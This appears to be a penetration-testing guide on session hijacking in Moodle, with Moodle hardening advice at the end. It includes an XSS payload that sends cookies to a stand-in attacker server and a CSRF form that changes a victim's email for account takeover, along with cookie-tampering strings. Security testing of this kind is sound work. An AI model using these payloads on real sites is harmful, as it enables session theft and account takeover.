# Moodle Session Hijacking: Technical Guide for Authorized Testing

**IMPORTANT DISCLAIMER**: This document is provided ONLY for authorized security professionals with proper written permission to test Moodle installations. Using these techniques against systems without explicit permission is illegal and unethical.

## Understanding Moodle's Session Management

Moodle typically uses two primary cookies for session management:

1. **MoodleSession**: The main session identifier that authenticates a user's session
2. **MOODLEID\_[instance]**: A secondary cookie often used for guest access and persistent sessions

When testing for session hijacking vulnerabilities, we focus on scenarios where these cookies might be exposed, stolen, or manipulated.

## Common Session Hijacking Vectors in Moodle

### 1. Cross-Site Scripting (XSS) Based Cookie Theft

XSS vulnerabilities can be used to steal session cookies if they are not properly protected.

#### Testing Method:

1. Identify potential XSS injection points (search fields, forum posts, profile fields)
2. Test with a basic XSS payload that accesses cookies:
   ```javascript
   <script>console.log(document.cookie)</script>
   ```
3. If successful, try a more advanced payload that exfiltrates cookies:
   ```javascript
   <script>
     fetch('https://your-controlled-server.com/collect?cookie='+encodeURIComponent(document.cookie))
   </script>
   ```
4. Check if the MoodleSession cookie is captured in the response

### 2. Session Fixation Attacks

Moodle versions with improper session management might be vulnerable to session fixation.

#### Testing Method:

1. Obtain a valid session ID (MoodleSession cookie) while not authenticated
2. Force this session ID on a victim's browser (in a test environment, this would be simulated)
3. Have the victim authenticate
4. Check if your original session is now authenticated as the victim

### 3. CSRF + Session Hijacking

Combining CSRF vulnerabilities with session management issues can lead to session hijacking.

#### Testing Method:

1. Create a CSRF payload that changes the victim's email or password:
   ```html
   <form
     action="https://moodle-target.com/user/editadvanced.php"
     method="POST"
     id="csrf-form"
   >
     <input type="hidden" name="id" value="VICTIM_ID" />
     <input type="hidden" name="email" value="attacker@example.com" />
     <input type="hidden" name="sesskey" value="VICTIM_SESSKEY" />
   </form>
   <script>
     document.getElementById("csrf-form").submit();
   </script>
   ```
2. Test if the payload executes when the victim visits a page containing this code
3. Verify if you can take over the account using the changed credentials

### 4. Man-in-the-Middle (MITM) Session Hijacking

If Moodle is not using HTTPS or has mixed content, session cookies may be transmitted in cleartext.

#### Testing Method:

1. Set up a controlled network environment for testing
2. Use a network analyzer like Wireshark to monitor traffic
3. Have a test user authenticate to Moodle
4. Check if the MoodleSession cookie is visible in cleartext in the captured traffic

### 5. Session Cookie Attributes Testing

Check if session cookies have proper security attributes.

#### Testing Method:

1. Authenticate to Moodle
2. Inspect the cookies using browser developer tools
3. Check for the following attributes on the MoodleSession cookie:
   - Secure flag (should be present)
   - HttpOnly flag (should be present)
   - SameSite attribute (should be set to Lax or Strict)
   - Proper expiration time

## Practical Testing Example

Here's a step-by-step process for testing session security in a controlled environment:

### Scenario: Testing XSS-based Cookie Theft

1. Set up a test Moodle instance with proper authorization
2. Create test user accounts (teacher and student)
3. Log in as the teacher and create a forum post with the following content:
   ```html
   <a onmouseover="alert(document.cookie)">hover over me</a>
   ```
4. Log in as the student and view the forum
5. Hover over the link and see if the cookie alert appears
6. If successful, this indicates a vulnerability that could be used for session hijacking

### Using the Moodle Security Scanner

The scanner includes dedicated modules for testing session security:

```bash
python moodle_scanner.py -t https://your-moodle-site.com -m session
```

This will automatically test for:

- Insecure cookie attributes
- Session fixation vulnerabilities
- CSRF protections related to session management
- XSS vectors that could lead to cookie theft

## Advanced Testing: Cookie Manipulation

Sometimes vulnerabilities exist in how Moodle validates session cookies.

### Testing Method:

1. Authenticate to Moodle and capture your valid MoodleSession cookie
2. Using a proxy tool like Burp Suite, try different cookie manipulation techniques:

   - Bit flipping attacks on the cookie value
   - Replacing sections of the cookie with values from other sessions
   - Testing for wildcard acceptance (e.g., replacing characters with \*)
   - Testing for length extension attacks if the cookie appears to be hash-based

3. Example of a cookie manipulation test with modified values:

   ```
   Original: MoodleSession=umnade9lvr3s3mk0dpol8aen1v

   Test cases:
   MoodleSession=umnade9lvr3s3mk0dpol8aen1v'
   MoodleSession=umnade9lvr3s3mk0dpol8aen1%00
   MoodleSession=umnade9lvr3s3mk0dpol8aen1v/../
   MoodleSession=%00umnade9lvr3s3mk0dpol8aen1v
   ```

## Protocol-Level Session Hijacking

Some Moodle installations may be vulnerable to protocol-level attacks.

### Testing for HTTP/HTTPS Mixed Content:

1. Access the Moodle site via HTTPS
2. Use browser developer tools to check for mixed content warnings
3. If resources are loaded via HTTP, cookies may be exposed in those requests

### Testing for Insecure Third-Party Integrations:

1. Identify third-party plugins or integrations used by the Moodle instance
2. Check if authentication tokens or session IDs are passed to these services
3. Verify if these communications are properly secured

## Post-Testing Actions

After completing session security testing:

1. Document all findings with evidence
2. Categorize issues by severity (based on ease of exploitation and impact)
3. Provide clear remediation steps for each vulnerability found
4. Recommend proper session security configurations:
   - Ensure HttpOnly and Secure flags are set on cookies
   - Implement proper CSRF protections
   - Set appropriate session timeout values
   - Configure Content Security Policy (CSP) to prevent XSS

## Remediation Recommendations

For Moodle administrators, the following steps can prevent session hijacking:

1. Keep Moodle updated to the latest version
2. Configure HTTPS across the entire site
3. Set proper cookie security attributes in config.php:
   ```php
   $CFG->cookiesecure = true;
   $CFG->cookiehttponly = true;
   ```
4. Implement a strong Content Security Policy
5. Set appropriate session timeout values:
   ```php
   $CFG->sessiontimeout = 7200;  // 2 hours
   ```
6. Enable session IP validation for additional security:
   ```php
   $CFG->sessionipvalidation = 1;
   ```

Remember: Always conduct security testing ethically and with proper authorization. The goal is to improve security, not to compromise systems.
